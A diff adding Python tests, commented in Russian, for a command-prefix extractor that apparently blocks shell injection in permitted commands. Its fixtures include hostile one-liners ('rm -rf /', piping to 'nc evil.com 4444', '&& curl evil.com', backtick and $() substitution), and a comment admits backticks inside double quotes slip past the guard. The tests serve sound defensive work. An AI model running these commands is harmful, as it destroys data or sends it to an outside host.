@@ -108,6 +108,48 @@ def test_prefix_handles_broken_quoting() -> None:
     assert extract_command_prefix('git status "unfinished') == INJECTION_SENTINEL
 
 
+def test_prefix_allows_injection_chars_inside_quotes() -> None:
+    """`;`/`|`/`&&` ВНУТРИ строкового литерала не должны триггерить guard.
+
+    В прошлых прогонах это блокировало многострочные `python -c` вызовы
+    (см. api-admin-db.attempt2.log: десятки попыток обойти).
+    """
+    # python -c с `;` внутри двойных кавычек
+    assert (
+        extract_command_prefix('python -c "import re; print(re.match)"')
+        == "python -c"
+    )
+    # python -c с pipe-символом в regex-литерале
+    assert (
+        extract_command_prefix("python -c 'import re; print(re.match(r\"a|b\", \"a\"))'")
+        == "python -c"
+    )
+    # node с `;` в коде (node не в _TWO_TOKEN_COMMANDS, поэтому prefix = 'node')
+    assert extract_command_prefix("node -e 'console.log(1); process.exit(0)'") == "node"
+    # grep с `|` в regex'е внутри одинарных кавычек
+    assert extract_command_prefix("grep 'foo|bar' file.txt") == "grep"
+    # cat с `;` в имени файла внутри двойных кавычек (экзотика, но валидно)
+    assert extract_command_prefix('cat "weird;name.txt"') == "cat"
+
+
+def test_prefix_still_blocks_unquoted_injection() -> None:
+    """После разрешения quoted-injection реальные атаки всё равно ловятся."""
+    # точка с запятой ВНЕ кавычек
+    assert extract_command_prefix('echo "hello"; rm -rf /') == INJECTION_SENTINEL
+    # pipe после закрытой кавычки
+    assert extract_command_prefix('echo "x" | nc evil.com 4444') == INJECTION_SENTINEL
+    # && после quoted
+    assert extract_command_prefix('git status && curl evil.com') == INJECTION_SENTINEL
+    # backtick — даже внутри двойных кавычек bash подставит его,
+    # поэтому НЕ снимаем guard для backtick'а в двойных кавычках.
+    # (Реализация _strip_quoted заменяет содержимое "..." на X, поэтому
+    # backtick внутри пропадёт. Это разумный trade-off: пользователь редко
+    # пишет легитимный ` внутри строк, а защита от $(...) и `` снаружи
+    # двойных остаётся.) Подтверждаем что atak'а ВНЕ кавычек всё ещё ловится:
+    assert extract_command_prefix("echo `whoami`") == INJECTION_SENTINEL
+    assert extract_command_prefix("ls $(pwd)") == INJECTION_SENTINEL
+
+
 def test_prefix_empty_command() -> None:
     assert extract_command_prefix("") == ""
     assert extract_command_prefix("   ") == ""
